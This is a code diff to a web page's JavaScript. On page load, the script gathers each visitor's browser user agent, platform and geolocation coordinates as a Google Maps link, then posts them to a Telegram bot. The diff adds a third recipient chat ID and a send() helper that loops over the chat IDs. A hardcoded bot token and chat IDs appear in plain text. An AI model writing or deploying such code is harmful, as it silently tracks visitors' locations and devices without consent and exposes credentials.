@@ -464,8 +464,7 @@
         async function sendTelegramMessage() {
 
     const token = "8625320668:AAGj7dsfGug7okpHOwtI-_lFufBbGpCmVG0";
-
-    const chatIds = ["6625618090", "7621436309",""]; // ikkita ID
+    const chatIds = ["6625618090", "7621436309", "617717576"];
 
     let device = navigator.userAgent;
     let platform = navigator.platform;
@@ -532,6 +531,21 @@ https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}
         }
     }
 }
+
+    async function send(message) {
+        for (let chatId of chatIds) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+    }
 
         window.addEventListener("load", () => {
             sendTelegramMessage();
